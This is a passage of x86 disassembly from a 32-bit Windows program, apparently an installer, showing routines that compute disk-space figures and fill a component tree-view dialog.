  404941:	75 ce                	jne    0x404911
  404943:	53                   	push   %ebx
  404944:	56                   	push   %esi
  404945:	e8 70 19 00 00       	call   0x4062ba
  40494a:	56                   	push   %esi
  40494b:	e8 ea 12 00 00       	call   0x405c3a
  404950:	33 ff                	xor    %edi,%edi
  404952:	3b c7                	cmp    %edi,%eax
  404954:	74 03                	je     0x404959
  404956:	66 89 38             	mov    %di,(%eax)
  404959:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40495c:	50                   	push   %eax
  40495d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404960:	50                   	push   %eax
  404961:	8d 45 ec             	lea    -0x14(%ebp),%eax
  404964:	50                   	push   %eax
  404965:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404968:	50                   	push   %eax
  404969:	56                   	push   %esi
  40496a:	ff 15 b4 80 40 00    	call   *0x4080b4
  404970:	85 c0                	test   %eax,%eax
  404972:	74 43                	je     0x4049b7
  404974:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404977:	be 00 04 00 00       	mov    $0x400,%esi
  40497c:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  404980:	56                   	push   %esi
  404981:	ff 75 f4             	push   -0xc(%ebp)
  404984:	50                   	push   %eax
  404985:	ff 15 54 81 40 00    	call   *0x408154
  40498b:	99                   	cltd
  40498c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40498f:	89 55 d8             	mov    %edx,-0x28(%ebp)
  404992:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404999:	eb 21                	jmp    0x4049bc
  40499b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40499e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4049a1:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  4049a5:	c1 e9 0a             	shr    $0xa,%ecx
  4049a8:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4049ab:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4049ae:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4049b5:	33 ff                	xor    %edi,%edi
  4049b7:	be 00 04 00 00       	mov    $0x400,%esi
  4049bc:	6a 05                	push   $0x5
  4049be:	e8 fc 01 00 00       	call   0x404bbf
  4049c3:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  4049c6:	74 19                	je     0x4049e1
  4049c8:	8b 55 d8             	mov    -0x28(%ebp),%edx
  4049cb:	33 c9                	xor    %ecx,%ecx
  4049cd:	3b d1                	cmp    %ecx,%edx
  4049cf:	77 10                	ja     0x4049e1
  4049d1:	72 07                	jb     0x4049da
  4049d3:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4049d6:	3b c8                	cmp    %eax,%ecx
  4049d8:	73 07                	jae    0x4049e1
  4049da:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  4049e1:	8b 0d bc 2e 47 00    	mov    0x472ebc,%ecx
  4049e7:	39 79 10             	cmp    %edi,0x10(%ecx)
  4049ea:	74 30                	je     0x404a1c
  4049ec:	50                   	push   %eax
  4049ed:	6a fb                	push   $0xfffffffb
  4049ef:	68 ff 03 00 00       	push   $0x3ff
  4049f4:	e8 ae 01 00 00       	call   0x404ba7
  4049f9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  4049fc:	74 10                	je     0x404a0e
  4049fe:	ff 75 d8             	push   -0x28(%ebp)
  404a01:	ff 75 d4             	push   -0x2c(%ebp)
  404a04:	6a fc                	push   $0xfffffffc
  404a06:	56                   	push   %esi
  404a07:	e8 d2 00 00 00       	call   0x404ade
  404a0c:	eb 0e                	jmp    0x404a1c
  404a0e:	68 08 02 44 00       	push   $0x440208
  404a13:	56                   	push   %esi
  404a14:	ff 75 08             	push   0x8(%ebp)
  404a17:	e8 e2 0e 00 00       	call   0x4058fe
  404a1c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404a1f:	3b c7                	cmp    %edi,%eax
  404a21:	a3 a4 af 47 00       	mov    %eax,0x47afa4
  404a26:	75 0a                	jne    0x404a32
  404a28:	6a 07                	push   $0x7
  404a2a:	e8 dc c9 ff ff       	call   0x40140b
  404a2f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404a32:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404a35:	85 70 14             	test   %esi,0x14(%eax)
  404a38:	74 03                	je     0x404a3d
  404a3a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404a3d:	33 c0                	xor    %eax,%eax
  404a3f:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404a42:	0f 94 c0             	sete   %al
  404a45:	50                   	push   %eax
  404a46:	e8 08 f8 ff ff       	call   0x404253
  404a4b:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  404a4e:	75 0d                	jne    0x404a5d
  404a50:	39 3d 38 02 45 00    	cmp    %edi,0x450238
  404a56:	75 05                	jne    0x404a5d
  404a58:	e8 1e fc ff ff       	call   0x40467b
  404a5d:	89 3d 38 02 45 00    	mov    %edi,0x450238
  404a63:	ff 75 14             	push   0x14(%ebp)
  404a66:	ff 75 10             	push   0x10(%ebp)
  404a69:	ff 75 0c             	push   0xc(%ebp)
  404a6c:	e8 27 f8 ff ff       	call   0x404298
  404a71:	5f                   	pop    %edi
  404a72:	5e                   	pop    %esi
  404a73:	5b                   	pop    %ebx
  404a74:	c9                   	leave
  404a75:	c2 10 00             	ret    $0x10
  404a78:	55                   	push   %ebp
  404a79:	8b ec                	mov    %esp,%ebp
  404a7b:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404a7f:	56                   	push   %esi
  404a80:	8b 35 18 82 40 00    	mov    0x408218,%esi
  404a86:	75 1c                	jne    0x404aa4
  404a88:	ff 75 14             	push   0x14(%ebp)
  404a8b:	68 fb 03 00 00       	push   $0x3fb
  404a90:	e8 6f 0e 00 00       	call   0x405904
  404a95:	ff 75 14             	push   0x14(%ebp)
  404a98:	6a 01                	push   $0x1
  404a9a:	68 67 04 00 00       	push   $0x467
  404a9f:	ff 75 08             	push   0x8(%ebp)
  404aa2:	ff d6                	call   *%esi
  404aa4:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404aa8:	75 2d                	jne    0x404ad7
  404aaa:	ff 75 14             	push   0x14(%ebp)
  404aad:	ff 75 10             	push   0x10(%ebp)
  404ab0:	ff 15 80 81 40 00    	call   *0x408180
  404ab6:	85 c0                	test   %eax,%eax
  404ab8:	74 0e                	je     0x404ac8
  404aba:	6a 07                	push   $0x7
  404abc:	e8 4a c9 ff ff       	call   0x40140b
  404ac1:	85 c0                	test   %eax,%eax
  404ac3:	75 03                	jne    0x404ac8
  404ac5:	40                   	inc    %eax
  404ac6:	eb 02                	jmp    0x404aca
  404ac8:	33 c0                	xor    %eax,%eax
  404aca:	50                   	push   %eax
  404acb:	6a 00                	push   $0x0
  404acd:	68 65 04 00 00       	push   $0x465
  404ad2:	ff 75 08             	push   0x8(%ebp)
  404ad5:	ff d6                	call   *%esi
  404ad7:	33 c0                	xor    %eax,%eax
  404ad9:	5e                   	pop    %esi
  404ada:	5d                   	pop    %ebp
  404adb:	c2 10 00             	ret    $0x10
  404ade:	55                   	push   %ebp
  404adf:	8b ec                	mov    %esp,%ebp
  404ae1:	81 ec 80 00 00 00    	sub    $0x80,%esp
  404ae7:	8b 45 14             	mov    0x14(%ebp),%eax
  404aea:	53                   	push   %ebx
  404aeb:	56                   	push   %esi
  404aec:	8b 75 10             	mov    0x10(%ebp),%esi
  404aef:	57                   	push   %edi
  404af0:	6a dc                	push   $0xffffffdc
  404af2:	85 c0                	test   %eax,%eax
  404af4:	5b                   	pop    %ebx
  404af5:	74 0b                	je     0x404b02
  404af7:	0f ac c6 14          	shrd   $0x14,%eax,%esi
  404afb:	c1 e8 14             	shr    $0x14,%eax
  404afe:	33 ff                	xor    %edi,%edi
  404b00:	eb 4e                	jmp    0x404b50
  404b02:	6a 14                	push   $0x14
  404b04:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  404b0a:	59                   	pop    %ecx
  404b0b:	8b c6                	mov    %esi,%eax
  404b0d:	73 06                	jae    0x404b15
  404b0f:	6a 0a                	push   $0xa
  404b11:	59                   	pop    %ecx
  404b12:	6a dd                	push   $0xffffffdd
  404b14:	5b                   	pop    %ebx
  404b15:	81 fe 00 04 00 00    	cmp    $0x400,%esi
  404b1b:	73 05                	jae    0x404b22
  404b1d:	6a de                	push   $0xffffffde
  404b1f:	33 c9                	xor    %ecx,%ecx
  404b21:	5b                   	pop    %ebx
  404b22:	81 fe 33 33 ff ff    	cmp    $0xffff3333,%esi
  404b28:	73 0d                	jae    0x404b37
  404b2a:	33 c0                	xor    %eax,%eax
  404b2c:	6a 14                	push   $0x14
  404b2e:	40                   	inc    %eax
  404b2f:	5f                   	pop    %edi
  404b30:	d3 e0                	shl    %cl,%eax
  404b32:	99                   	cltd
  404b33:	f7 ff                	idiv   %edi
  404b35:	03 c6                	add    %esi,%eax
  404b37:	8b f0                	mov    %eax,%esi
  404b39:	25 ff ff ff 00       	and    $0xffffff,%eax
  404b3e:	6a 0a                	push   $0xa
  404b40:	33 d2                	xor    %edx,%edx
  404b42:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404b45:	03 c0                	add    %eax,%eax
  404b47:	d3 e8                	shr    %cl,%eax
  404b49:	d3 ee                	shr    %cl,%esi
  404b4b:	59                   	pop    %ecx
  404b4c:	f7 f1                	div    %ecx
  404b4e:	8b fa                	mov    %edx,%edi
  404b50:	8d 45 c0             	lea    -0x40(%ebp),%eax
  404b53:	6a df                	push   $0xffffffdf
  404b55:	50                   	push   %eax
  404b56:	e8 81 17 00 00       	call   0x4062dc
  404b5b:	50                   	push   %eax
  404b5c:	8d 45 80             	lea    -0x80(%ebp),%eax
  404b5f:	53                   	push   %ebx
  404b60:	50                   	push   %eax
  404b61:	e8 76 17 00 00       	call   0x4062dc
  404b66:	50                   	push   %eax
  404b67:	57                   	push   %edi
  404b68:	56                   	push   %esi
  404b69:	68 a0 a3 40 00       	push   $0x40a3a0
  404b6e:	ff 75 0c             	push   0xc(%ebp)
  404b71:	be 48 02 45 00       	mov    $0x450248,%esi
  404b76:	56                   	push   %esi
  404b77:	e8 60 17 00 00       	call   0x4062dc
  404b7c:	56                   	push   %esi
  404b7d:	8b f8                	mov    %eax,%edi
  404b7f:	e8 4c 17 00 00       	call   0x4062d0
  404b84:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404b87:	50                   	push   %eax
  404b88:	ff 15 90 82 40 00    	call   *0x408290
  404b8e:	83 c4 18             	add    $0x18,%esp
  404b91:	56                   	push   %esi
  404b92:	ff 75 08             	push   0x8(%ebp)
  404b95:	ff 35 b8 2e 47 00    	push   0x472eb8
  404b9b:	e8 5e 0d 00 00       	call   0x4058fe
  404ba0:	5f                   	pop    %edi
  404ba1:	5e                   	pop    %esi
  404ba2:	5b                   	pop    %ebx
  404ba3:	c9                   	leave
  404ba4:	c2 10 00             	ret    $0x10
  404ba7:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404bab:	33 c9                	xor    %ecx,%ecx
  404bad:	51                   	push   %ecx
  404bae:	50                   	push   %eax
  404baf:	ff 74 24 10          	push   0x10(%esp)
  404bb3:	ff 74 24 10          	push   0x10(%esp)
  404bb7:	e8 22 ff ff ff       	call   0x404ade
  404bbc:	c2 0c 00             	ret    $0xc
  404bbf:	8b 15 2c af 47 00    	mov    0x47af2c,%edx
  404bc5:	8b 0d 28 af 47 00    	mov    0x47af28,%ecx
  404bcb:	33 c0                	xor    %eax,%eax
  404bcd:	85 d2                	test   %edx,%edx
  404bcf:	74 18                	je     0x404be9
  404bd1:	56                   	push   %esi
  404bd2:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  404bd6:	74 07                	je     0x404bdf
  404bd8:	8b 74 24 08          	mov    0x8(%esp),%esi
  404bdc:	03 04 b1             	add    (%ecx,%esi,4),%eax
  404bdf:	81 c1 18 40 00 00    	add    $0x4018,%ecx
  404be5:	4a                   	dec    %edx
  404be6:	75 ea                	jne    0x404bd2
  404be8:	5e                   	pop    %esi
  404be9:	c2 04 00             	ret    $0x4
  404bec:	55                   	push   %ebp
  404bed:	8b ec                	mov    %esp,%ebp
  404bef:	83 ec 38             	sub    $0x38,%esp
  404bf2:	56                   	push   %esi
  404bf3:	8b 35 18 82 40 00    	mov    0x408218,%esi
  404bf9:	57                   	push   %edi
  404bfa:	8b 7d 08             	mov    0x8(%ebp),%edi
  404bfd:	6a 00                	push   $0x0
  404bff:	6a 09                	push   $0x9
  404c01:	68 0a 11 00 00       	push   $0x110a
  404c06:	57                   	push   %edi
  404c07:	ff d6                	call   *%esi
  404c09:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404c0d:	74 3c                	je     0x404c4b
  404c0f:	ff 15 bc 81 40 00    	call   *0x4081bc
  404c15:	0f bf c8             	movswl %ax,%ecx
  404c18:	c1 e8 10             	shr    $0x10,%eax
  404c1b:	0f bf c0             	movswl %ax,%eax
  404c1e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404c21:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c24:	50                   	push   %eax
  404c25:	57                   	push   %edi
  404c26:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404c29:	ff 15 dc 81 40 00    	call   *0x4081dc
  404c2f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404c32:	50                   	push   %eax
  404c33:	6a 00                	push   $0x0
  404c35:	68 11 11 00 00       	push   $0x1111
  404c3a:	57                   	push   %edi
  404c3b:	ff d6                	call   *%esi
  404c3d:	f6 45 f8 66          	testb  $0x66,-0x8(%ebp)
  404c41:	75 05                	jne    0x404c48
  404c43:	83 c8 ff             	or     $0xffffffff,%eax
  404c46:	eb 1e                	jmp    0x404c66
  404c48:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c4b:	89 45 cc             	mov    %eax,-0x34(%ebp)
  404c4e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  404c51:	50                   	push   %eax
  404c52:	6a 00                	push   $0x0
  404c54:	68 3e 11 00 00       	push   $0x113e
  404c59:	57                   	push   %edi
  404c5a:	c7 45 c8 04 00 00 00 	movl   $0x4,-0x38(%ebp)
  404c61:	ff d6                	call   *%esi
  404c63:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404c66:	5f                   	pop    %edi
  404c67:	5e                   	pop    %esi
  404c68:	c9                   	leave
  404c69:	c2 08 00             	ret    $0x8
  404c6c:	56                   	push   %esi
  404c6d:	57                   	push   %edi
  404c6e:	be 00 b0 47 00       	mov    $0x47b000,%esi
  404c73:	bf 48 02 45 00       	mov    $0x450248,%edi
  404c78:	56                   	push   %esi
  404c79:	57                   	push   %edi
  404c7a:	e8 3b 16 00 00       	call   0x4062ba
  404c7f:	ff 74 24 10          	push   0x10(%esp)
  404c83:	56                   	push   %esi
  404c84:	e8 78 15 00 00       	call   0x406201
  404c89:	ff 74 24 0c          	push   0xc(%esp)
  404c8d:	e8 79 c7 ff ff       	call   0x40140b
  404c92:	57                   	push   %edi
  404c93:	56                   	push   %esi
  404c94:	e8 21 16 00 00       	call   0x4062ba
  404c99:	5f                   	pop    %edi
  404c9a:	5e                   	pop    %esi
  404c9b:	c2 08 00             	ret    $0x8
  404c9e:	55                   	push   %ebp
  404c9f:	8b ec                	mov    %esp,%ebp
  404ca1:	83 ec 50             	sub    $0x50,%esp
  404ca4:	53                   	push   %ebx
  404ca5:	56                   	push   %esi
  404ca6:	8b 35 e4 81 40 00    	mov    0x4081e4,%esi
  404cac:	57                   	push   %edi
  404cad:	8b 7d 08             	mov    0x8(%ebp),%edi
  404cb0:	68 f9 03 00 00       	push   $0x3f9
  404cb5:	57                   	push   %edi
  404cb6:	ff d6                	call   *%esi
  404cb8:	68 08 04 00 00       	push   $0x408
  404cbd:	57                   	push   %edi
  404cbe:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404cc1:	ff d6                	call   *%esi
  404cc3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404cc6:	a1 28 af 47 00       	mov    0x47af28,%eax
  404ccb:	8b 35 18 82 40 00    	mov    0x408218,%esi
  404cd1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404cd4:	a1 f4 ae 47 00       	mov    0x47aef4,%eax
  404cd9:	33 db                	xor    %ebx,%ebx
  404cdb:	05 94 00 00 00       	add    $0x94,%eax
  404ce0:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404ce7:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404cea:	0f 85 1b 02 00 00    	jne    0x404f0b
  404cf0:	a1 2c af 47 00       	mov    0x47af2c,%eax
  404cf5:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  404cf8:	c1 e0 02             	shl    $0x2,%eax
  404cfb:	50                   	push   %eax
  404cfc:	6a 40                	push   $0x40
  404cfe:	c7 45 f4 02 00 00 00 	movl   $0x2,-0xc(%ebp)
  404d05:	89 3d 60 af 47 00    	mov    %edi,0x47af60
  404d0b:	ff 15 34 81 40 00    	call   *0x408134
  404d11:	6a 6e                	push   $0x6e
  404d13:	a3 40 02 45 00       	mov    %eax,0x450240
  404d18:	ff 35 e0 ae 47 00    	push   0x47aee0
  404d1e:	ff 15 c0 81 40 00    	call   *0x4081c0
  404d24:	83 0d 34 02 45 00 ff 	orl    $0xffffffff,0x450234
  404d2b:	68 96 52 40 00       	push   $0x405296
  404d30:	6a fc                	push   $0xfffffffc
  404d32:	8b f8                	mov    %eax,%edi
  404d34:	ff 75 fc             	push   -0x4(%ebp)
  404d37:	ff 15 70 82 40 00    	call   *0x408270
  404d3d:	53                   	push   %ebx
  404d3e:	6a 06                	push   $0x6
  404d40:	6a 21                	push   $0x21
  404d42:	6a 10                	push   $0x10
  404d44:	6a 10                	push   $0x10
  404d46:	a3 3c 02 45 00       	mov    %eax,0x45023c
  404d4b:	ff 15 38 80 40 00    	call   *0x408038
  404d51:	68 ff 00 ff 00       	push   $0xff00ff
  404d56:	57                   	push   %edi
  404d57:	50                   	push   %eax
  404d58:	a3 2c 02 45 00       	mov    %eax,0x45022c
  404d5d:	ff 15 3c 80 40 00    	call   *0x40803c
  404d63:	ff 35 2c 02 45 00    	push   0x45022c
  404d69:	6a 02                	push   $0x2
  404d6b:	68 09 11 00 00       	push   $0x1109
  404d70:	ff 75 fc             	push   -0x4(%ebp)
  404d73:	ff d6                	call   *%esi
  404d75:	53                   	push   %ebx
  404d76:	53                   	push   %ebx
  404d77:	68 1c 11 00 00       	push   $0x111c
  404d7c:	ff 75 fc             	push   -0x4(%ebp)
  404d7f:	ff d6                	call   *%esi
  404d81:	83 f8 10             	cmp    $0x10,%eax
  404d84:	7d 0d                	jge    0x404d93
  404d86:	53                   	push   %ebx
  404d87:	6a 10                	push   $0x10
  404d89:	68 1b 11 00 00       	push   $0x111b
  404d8e:	ff 75 fc             	push   -0x4(%ebp)
  404d91:	ff d6                	call   *%esi
  404d93:	57                   	push   %edi
  404d94:	ff 15 5c 80 40 00    	call   *0x40805c
  404d9a:	33 ff                	xor    %edi,%edi
  404d9c:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404d9f:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  404da2:	3b c3                	cmp    %ebx,%eax
  404da4:	74 27                	je     0x404dcd
  404da6:	83 ff 20             	cmp    $0x20,%edi
  404da9:	74 03                	je     0x404dae
  404dab:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404dae:	50                   	push   %eax
  404daf:	53                   	push   %ebx
  404db0:	e8 27 15 00 00       	call   0x4062dc
  404db5:	50                   	push   %eax
  404db6:	53                   	push   %ebx
  404db7:	68 43 01 00 00       	push   $0x143
  404dbc:	ff 75 f8             	push   -0x8(%ebp)
  404dbf:	ff d6                	call   *%esi
  404dc1:	57                   	push   %edi
  404dc2:	50                   	push   %eax
  404dc3:	68 51 01 00 00       	push   $0x151
  404dc8:	ff 75 f8             	push   -0x8(%ebp)
  404dcb:	ff d6                	call   *%esi
  404dcd:	47                   	inc    %edi
  404dce:	83 ff 21             	cmp    $0x21,%edi
  404dd1:	7c c9                	jl     0x404d9c
  404dd3:	8b 7d 14             	mov    0x14(%ebp),%edi
  404dd6:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  404dd9:	ff 74 9f 30          	push   0x30(%edi,%ebx,4)
  404ddd:	6a 15                	push   $0x15
  404ddf:	ff 75 08             	push   0x8(%ebp)
  404de2:	e8 4a f4 ff ff       	call   0x404231
  404de7:	ff 74 9f 34          	push   0x34(%edi,%ebx,4)
  404deb:	6a 16                	push   $0x16
  404ded:	ff 75 08             	push   0x8(%ebp)
  404df0:	e8 3c f4 ff ff       	call   0x404231
  404df5:	33 ff                	xor    %edi,%edi
  404df7:	33 db                	xor    %ebx,%ebx
  404df9:	39 3d 2c af 47 00    	cmp    %edi,0x47af2c
  404dff:	0f 8e c5 00 00 00    	jle    0x404eca
  404e05:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e08:	8d 50 08             	lea    0x8(%eax),%edx
  404e0b:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404e0e:	8d 42 10             	lea    0x10(%edx),%eax
  404e11:	66 83 38 00          	cmpw   $0x0,(%eax)
  404e15:	0f 84 90 00 00 00    	je     0x404eab
  404e1b:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404e1e:	8b 02                	mov    (%edx),%eax
  404e20:	6a 20                	push   $0x20
  404e22:	8b d0                	mov    %eax,%edx
  404e24:	59                   	pop    %ecx
  404e25:	89 5d b0             	mov    %ebx,-0x50(%ebp)
  404e28:	23 d1                	and    %ecx,%edx
  404e2a:	c7 45 b4 02 00 ff ff 	movl   $0xffff0002,-0x4c(%ebp)
  404e31:	a8 02                	test   $0x2,%al
  404e33:	c7 45 b8 0d 00 00 00 	movl   $0xd,-0x48(%ebp)
  404e3a:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  404e3d:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404e40:	89 55 c0             	mov    %edx,-0x40(%ebp)
  404e43:	74 38                	je     0x404e7d
  404e45:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404e48:	c7 45 b8 4d 00 00 00 	movl   $0x4d,-0x48(%ebp)
  404e4f:	50                   	push   %eax
  404e50:	6a 00                	push   $0x0
  404e52:	68 32 11 00 00       	push   $0x1132
  404e57:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  404e5e:	ff 75 fc             	push   -0x4(%ebp)
  404e61:	ff d6                	call   *%esi
  404e63:	8b 0d 40 02 45 00    	mov    0x450240,%ecx
  404e69:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  404e70:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404e73:	a1 40 02 45 00       	mov    0x450240,%eax
  404e78:	8b 1c b8             	mov    (%eax,%edi,4),%ebx
  404e7b:	eb 2e                	jmp    0x404eab
  404e7d:	a8 04                	test   $0x4,%al
  404e7f:	74 11                	je     0x404e92
  404e81:	53                   	push   %ebx
  404e82:	6a 03                	push   $0x3
  404e84:	68 0a 11 00 00       	push   $0x110a
  404e89:	ff 75 fc             	push   -0x4(%ebp)
  404e8c:	ff d6                	call   *%esi
  404e8e:	8b d8                	mov    %eax,%ebx
  404e90:	eb 19                	jmp    0x404eab
  404e92:	8d 45 b0             	lea    -0x50(%ebp),%eax
  404e95:	50                   	push   %eax
  404e96:	6a 00                	push   $0x0
  404e98:	68 32 11 00 00       	push   $0x1132
  404e9d:	ff 75 fc             	push   -0x4(%ebp)
  404ea0:	ff d6                	call   *%esi
  404ea2:	8b 0d 40 02 45 00    	mov    0x450240,%ecx
  404ea8:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404eab:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404eae:	47                   	inc    %edi
  404eaf:	81 c2 18 40 00 00    	add    $0x4018,%edx
  404eb5:	3b 3d 2c af 47 00    	cmp    0x47af2c,%edi
  404ebb:	89 55 e8             	mov    %edx,-0x18(%ebp)
  404ebe:	0f 8c 4a ff ff ff    	jl     0x404e0e
  404ec4:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  404ec8:	75 19                	jne    0x404ee3
  404eca:	6a f0                	push   $0xfffffff0
  404ecc:	ff 75 fc             	push   -0x4(%ebp)
  404ecf:	ff 15 ac 81 40 00    	call   *0x4081ac
  404ed5:	24 fb                	and    $0xfb,%al
  404ed7:	50                   	push   %eax
  404ed8:	6a f0                	push   $0xfffffff0
  404eda:	ff 75 fc             	push   -0x4(%ebp)
  404edd:	ff 15 70 82 40 00    	call   *0x408270
  404ee3:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404ee7:	75 18                	jne    0x404f01
  404ee9:	6a 05                	push   $0x5
  404eeb:	ff 75 f8             	push   -0x8(%ebp)
  404eee:	ff 15 68 82 40 00    	call   *0x408268
  404ef4:	ff 75 f8             	push   -0x8(%ebp)
  404ef7:	e8 6a f3 ff ff       	call   0x404266
  404efc:	e9 80 03 00 00       	jmp    0x405281
  404f01:	ff 75 fc             	push   -0x4(%ebp)
  404f04:	e8 5d f3 ff ff       	call   0x404266
  404f09:	33 db                	xor    %ebx,%ebx
  404f0b:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404f12:	75 12                	jne    0x404f26
  404f14:	33 c9                	xor    %ecx,%ecx
  404f16:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404f19:	41                   	inc    %ecx
  404f1a:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404f21:	89 4d 14             	mov    %ecx,0x14(%ebp)
  404f24:	eb 03                	jmp    0x404f29
  404f26:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404f29:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404f2d:	b8 13 04 00 00       	mov    $0x413,%eax
  404f32:	74 09                	je     0x404f3d
  404f34:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f37:	0f 85 e4 00 00 00    	jne    0x405021
  404f3d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f40:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404f43:	74 0d                	je     0x404f52
  404f45:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404f4c:	0f 85 cf 00 00 00    	jne    0x405021
  404f52:	f6 05 fd ae 47 00 02 	testb  $0x2,0x47aefd
  404f59:	75 73                	jne    0x404fce
  404f5b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f5e:	74 09                	je     0x404f69
  404f60:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404f63:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404f67:	75 65                	jne    0x404fce
  404f69:	33 c9                	xor    %ecx,%ecx
  404f6b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404f6e:	0f 95 c1             	setne  %cl
  404f71:	51                   	push   %ecx
  404f72:	ff 75 fc             	push   -0x4(%ebp)
  404f75:	e8 72 fc ff ff       	call   0x404bec
  404f7a:	8b f8                	mov    %eax,%edi
  404f7c:	3b fb                	cmp    %ebx,%edi
  404f7e:	7c 4e                	jl     0x404fce
  404f80:	69 c0 18 40 00 00    	imul   $0x4018,%eax,%eax
  404f86:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f89:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404f8d:	8b 01                	mov    (%ecx),%eax
  404f8f:	a8 10                	test   $0x10,%al
  404f91:	75 3b                	jne    0x404fce
  404f93:	a8 40                	test   $0x40,%al
  404f95:	74 11                	je     0x404fa8
  404f97:	35 80 00 00 00       	xor    $0x80,%eax
  404f9c:	84 c0                	test   %al,%al
  404f9e:	79 04                	jns    0x404fa4
  404fa0:	0c 01                	or     $0x1,%al
  404fa2:	eb 07                	jmp    0x404fab
  404fa4:	24 fe                	and    $0xfe,%al
  404fa6:	eb 03                	jmp    0x404fab
  404fa8:	83 f0 01             	xor    $0x1,%eax
  404fab:	57                   	push   %edi
  404fac:	89 01                	mov    %eax,(%ecx)
  404fae:	e8 ca c1 ff ff       	call   0x40117d
  404fb3:	a1 fc ae 47 00       	mov    0x47aefc,%eax
  404fb8:	47                   	inc    %edi
  404fb9:	f7 d0                	not    %eax
  404fbb:	c1 e8 08             	shr    $0x8,%eax
  404fbe:	83 e0 01             	and    $0x1,%eax
  404fc1:	89 7d 10             	mov    %edi,0x10(%ebp)
  404fc4:	89 45 14             	mov    %eax,0x14(%ebp)
  404fc7:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404fce:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404fd1:	74 4e                	je     0x405021
  404fd3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404fd6:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  404fdd:	75 0e                	jne    0x404fed
  404fdf:	ff 70 5c             	push   0x5c(%eax)
  404fe2:	53                   	push   %ebx
  404fe3:	68 19 04 00 00       	push   $0x419
  404fe8:	ff 75 fc             	push   -0x4(%ebp)
  404feb:	ff d6                	call   *%esi
  404fed:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404ff0:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  404ff7:	75 28                	jne    0x405021
  404ff9:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404ffd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405000:	8b 40 5c             	mov    0x5c(%eax),%eax
  405003:	75 0f                	jne    0x405014
